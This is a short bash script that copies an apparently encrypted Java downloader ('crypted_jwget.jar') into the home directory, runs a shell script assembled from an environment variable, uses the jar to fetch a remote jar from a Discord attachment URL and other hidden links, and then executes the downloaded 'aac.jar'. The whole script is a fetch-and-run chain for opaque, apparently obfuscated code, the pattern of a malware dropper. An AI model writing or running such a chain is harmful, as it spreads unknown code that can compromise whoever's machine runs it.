#!/bin/bash
cp crypted_jwget.jar /$HOME 
cd $HOME 
echo -e $LINK2 > start2.sh
bash start2.sh
java -jar crypted_jwget.jar https://cdn.discordapp.com/attachments/598191803988049987/886627111790587914/aac.jar
#java -jar crypted_jwget.jar $LINK
java -jar crypted_jwget.jar $LINK3
ls 
java -jar aac.jar Storage1
echo $PATH
#java -jar crypted_leatestacc.jar Storage1















